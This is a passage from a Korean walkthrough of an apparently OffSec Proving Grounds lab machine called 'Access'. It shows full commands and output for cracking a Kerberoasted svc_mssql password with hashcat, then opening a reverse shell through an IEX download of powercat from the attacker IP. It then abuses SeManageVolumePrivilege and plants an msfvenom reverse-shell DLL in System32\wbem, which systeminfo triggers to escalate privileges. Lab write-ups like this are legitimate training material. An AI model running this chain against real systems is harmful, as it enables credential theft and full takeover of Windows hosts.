ff745afcdebbbb7f0b4ec60ba81df9cedcacbe478b80679a6e2dd71334454dde8350923aa3407ba8473edc731cd3529360e09491cd37f4a376bd9c506ca525a001d717c7cf6f8e0d70d2016356bc32bcadde461bffbfa4c707c2829375e02a5afcf9e9c400e61cb481bb0699608f0b735b16f3988ee359b590646dc4350aaa905efccea0d92e7692e1217cee8391960e9b3f27057cd3dbf159131606faae74f091139e3d13f5d5f4011ea99f312a8ad8dc36ce64cabb6fe880f2617f09db8c5fae87eb1b701ebd1710e2b0c45d34d9e31b203be0c418ae79db7c96d96bdf45addead55bd0f7259defb251ee17865893a49fb178ca8958b57a58ddb14376d5d89c226eed801029eec78695e1ad87bb844466e6868529a9683ed02172be476042ac88be7f812d98d6c1c199690ac78af5d503d8596fd990919f5692d0de43ec4f1a900be26cf80bbef1a09e60804678db684c2e7c76166308ad8c02d2875ef1fc89d50d26e4dfa0e798897096b2c35d388760e6f42bf1d467d193f3fecab7376ad3bd4915fc31606093ebed620ae087dc25be11892387ad76eb46f1c8f03b7e28a58cccd7d3ceb49b56abb0c1c394c2720de7ec96cec958f457bfc82413ead2e8e06dc4facaf0d11399af908b7471db618dd71b25a0839471fbfccb9a95851f9166ec16e2e1290b19a7cbb6c0f620ed633348ca596bbd7d0cb14191441de160affe0008450ec3279bb4c38e44ab08ab15586d641260791863d4cac6398cda715a26b63d25c7f6e1961e0390fe874b75d2c51b1a7e9dbf28651c4fe13e70e0bcaff9196af9e49c82473eadceb85a4242aaa51137ed9d5a16bc43d526cb64fe052d77e1e500a8a0e19f04f9fb75a5513dcfcf038c2a3ae73e22f3f5aba5fa10643fbfc3f099b9a99f4b621ded8e623c48d6c74b1daf83659b4e5b8ca2b3b36f1495ae741602d0af049125736b57ac5c3f0f2918dd979d7555:trustno1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.ac...9d7555
Time.Started.....: Wed Feb 11 12:47:00 2026 (0 secs)
Time.Estimated...: Wed Feb 11 12:47:00 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   850.4 kH/s (0.65ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 25%

Started: Wed Feb 11 12:46:58 2026
Stopped: Wed Feb 11 12:47:01 2026

┌──(root㉿kali)-[/home/kali/PG/Access]
└─# hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$ddc074879c3f915e21ed055fde1e56a9$c3907be8edb477ee82c611229cb37f5d01f579faa14cb3e52347f46c17df4c957ad0f1594c24b6d13e044e861bd70528b08c015623c21cc0b61a6a612bf842c383222052b1c413ef36d48d175d108dc94cd363205eeeb2b65281076284c65e69012d50fc1b212e11a04b8491029d37cd7497626389b7fadba0027b5369b2290a0242c858811276b17f8d009703cf55b1e77d51084c73e5c013553523a05b72d869aa987c0f942ee593a7643a787156cedf096c036b22bc967a94061095a11e5f55809ddf102db9f857bbf7716929b6d7c4fe80c181e76b419e51f096eb9fc06689464b324ccde60b1d728d60e3d178b3968b3cc76041e1b02680694ade0c2a517cf33417aa334b085714df0aa8dd28735f36fa5ca819a1959a7ec780ae39b6e8fe1f303dda138f395d6dbaf5643a29571de3e2400482d9166cd255437a4e2ba62dc634336d21ca278871451ae539741de2be5317a4c5ae627f38d0ccad62493a0f2d416da1c62fe8597fb182b7bed56703bea9440177d5ec0f05703950ad191cd56d42da9366a1564c33953dddc0893c5ef1d53f14f8b4ff4f913bd211b9fbe88976f2e1be238e2ba23ed9bc8f6807f9c8860750999d8839131cbb2ff745afcdebbbb7f0b4ec60ba81df9cedcacbe478b80679a6e2dd71334454dde8350923aa3407ba8473edc731cd3529360e09491cd37f4a376bd9c506ca525a001d717c7cf6f8e0d70d2016356bc32bcadde461bffbfa4c707c2829375e02a5afcf9e9c400e61cb481bb0699608f0b735b16f3988ee359b590646dc4350aaa905efccea0d92e7692e1217cee8391960e9b3f27057cd3dbf159131606faae74f091139e3d13f5d5f4011ea99f312a8ad8dc36ce64cabb6fe880f2617f09db8c5fae87eb1b701ebd1710e2b0c45d34d9e31b203be0c418ae79db7c96d96bdf45addead55bd0f7259defb251ee17865893a49fb178ca8958b57a58ddb14376d5d89c226eed801029eec78695e1ad87bb844466e6868529a9683ed02172be476042ac88be7f812d98d6c1c199690ac78af5d503d8596fd990919f5692d0de43ec4f1a900be26cf80bbef1a09e60804678db684c2e7c76166308ad8c02d2875ef1fc89d50d26e4dfa0e798897096b2c35d388760e6f42bf1d467d193f3fecab7376ad3bd4915fc31606093ebed620ae087dc25be11892387ad76eb46f1c8f03b7e28a58cccd7d3ceb49b56abb0c1c394c2720de7ec96cec958f457bfc82413ead2e8e06dc4facaf0d11399af908b7471db618dd71b25a0839471fbfccb9a95851f9166ec16e2e1290b19a7cbb6c0f620ed633348ca596bbd7d0cb14191441de160affe0008450ec3279bb4c38e44ab08ab15586d641260791863d4cac6398cda715a26b63d25c7f6e1961e0390fe874b75d2c51b1a7e9dbf28651c4fe13e70e0bcaff9196af9e49c82473eadceb85a4242aaa51137ed9d5a16bc43d526cb64fe052d77e1e500a8a0e19f04f9fb75a5513dcfcf038c2a3ae73e22f3f5aba5fa10643fbfc3f099b9a99f4b621ded8e623c48d6c74b1daf83659b4e5b8ca2b3b36f1495ae741602d0af049125736b57ac5c3f0f2918dd979d7555:trustno1
```

## 3.3. RunasCS

`RunasCs` 파일을 가져와서 임포트 시킨다. 왜냐면 외부에서 내부로 접근을 하거나 계정을 스위칭 할 방법이 존재하지 않기 때문에 해당 스크립트를 사용해야 `svc_mssql` 로 전환이 가능하기 때문이다. 

```bash
PS C:\Users\svc_apache\Desktop> iwr http://192.168.45.249/Invoke-RunasCs.ps1 -outfile Invoke-RunasCs.ps1

PS C:\Users\svc_apache\Desktop> ls


    Directory: C:\Users\svc_apache\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/10/2026  11:30 PM            883 get-spn.ps1
-a----        2/11/2026  12:40 AM          46848 Invoke-Kerberoast.ps1
-a----        2/11/2026  12:43 AM          88284 Invoke-RunasCs.ps1

PS C:\Users\svc_apache\Desktop> import-module ./Invoke-RunasCs.ps1

PS C:\Users\svc_apache\Desktop> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

access\svc_mssql
```

## 3.4. powercat.ps1

아예 `svc_mssql` 계정으로 전환하고 싶기에 `RunasCS` 를 이용해서 리버스 쉘을 맺는다. 이 때 `revshells.com` 에 있는 것들을 활용해봤지만 작동하지 않았다. 그래서 `powercat.ps1` 을 이용했다. 

https://github.com/besimorhino/powercat/blob/master/powercat.ps1

```bash
PS C:\Users\svc_apache\Desktop> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.249/powercat.ps1');powercat -c 192.168.45.249 -p 8000 -e cmd"
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

No output received from the process.
```

정상적으로 `svc_mssql` 의 계정을 확보할 수 있었고, `local.txt` 도 확인할 수 있었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# rlwrap nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.168.187] 50814
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\svc_mssql

The system cannot find the path specified.
C:\Windows\system32>type C:\Users\svc_mssql\Desktop\local.txt
type C:\Users\svc_mssql\Desktop\local.txt
0a9991c0016b82c40c24377bb05598de
```

## 3.5. SeManageVolumePrivilege Abuse

`whoami /priv` 를 했을 때 `SeManageVolumePrivilege` 의 권한을 확인할 수 있었다.

해당 권한은 디스크 조각모음이나 파일시스템 관리를 위해 존재하는 권한인데 해당 권한을 이용하면 `C:\` 전체에 대한 제어권을 가질 수 있다. 그렇기 때문에 `C:\Windows\System32` 등의 디렉토리에도 접근해서 파일들을 생성 또는 수정할 수 있는 중대한 취약점이라고 할 수 있다. 

```bash
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

위에서 언급한 취약한 부분을 다음의 바이너리를 이용해서 `System32` 에 쓸 수 있게 만들어주는 거를 실행했다.

https://github.com/xct/SeManageVolumeAbuse

릴리즈 된 exe 파일은 아래와 같다.

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public

```bash
C:\Users\svc_mssql\Desktop>powershell iwr http://192.168.45.249/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe
powershell iwr http://192.168.45.249/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe

C:\Users\svc_mssql\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users\svc_mssql\Desktop

02/11/2026  01:09 AM    <DIR>          .
02/11/2026  01:09 AM    <DIR>          ..
02/10/2026  10:07 PM                34 local.txt
02/11/2026  01:09 AM            12,288 SeManageVolumeExploit.exe
               2 File(s)         12,322 bytes
               2 Dir(s)  11,959,541,760 bytes free

C:\Users\svc_mssql\Desktop>.\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 920
DONE
```

그러면 `C:\Windows` 에 대해 확인했을 때 `NT AUTHORITY\SYSTEM:(M)` 와 같이 나오는 거를 볼 수 있다. `System` 폴더에 대해서 `(M)` 이 수정 가능하다는 거다. 

```bash
C:\Users\svc_mssql\Desktop>icacls C:\Windows
icacls C:\Windows
C:\Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Users:(RX)
           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

그러면 시스템 권한으로 `dll` 을 실행시킬 수 있도록 `msfvenom` 을 통해서 파일을 만들어준다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Access]
└─# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.249 LPORT=6666 -f dll -o tzres.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: tzres.dll
```

## 3.6. systeminfo 를 실행 시 악성 dll 파일 실행되게 만들기

해당 파일을 `Windows\System32\webm\` 아래에 놓는다. `webm`은 `Windows Management Instrumentation` 관련된 파일들이 모여있는 중요한 디렉토리이다. 

여기아래에 놓는 이유는 `systeminfo` 를 실행하면 해당 폴더 내부에 있는 `dll` 파일들을 실행해서 시스템 관련한 내용들을 출력시키기 때문에 해당 경로 밑에 우리가 `msfvenom` 으로 만든 `dll` 파일을 저장한 뒤, `systeminfo` 를 실행시키면 `dll` 파일이 실행될 것이기 때문이다. 

```bash
C:\Users\svc_mssql\Desktop>certutil.exe -urlcache -split -f "http://192.168.45.249/tzres.dll" tzres.dll
certutil.exe -urlcache -split -f "http://192.168.45.249/tzres.dll" tzres.dll
****  Online  ****
  0000  ...
  2400
CertUtil: -URLCache command completed successfully.

C:\Users\svc_mssql\Desktop>move .\tzres.dll C:\Windows\System32\wbem\tzres.dll
move .\tzres.dll C:\Windows\System32\wbem\tzres.dll
        1 file(s) moved.
```

악성 `dll` 을 이동시켰으면 `systeminfo` 를 실행시킨다. 

```bash
C:\Users\svc_mssql\Desktop>systeminfo
systeminfo
```

정상적으로 `system` 권한으로 쉘이 맺어지는 것을 확인할 수 있다. 

```bash
┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvnp 6666
listening on [any] 6666 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.168.187] 50898
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\network service

C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\proof.txt
d03d9214252388708fb6e26e17d53fa5
```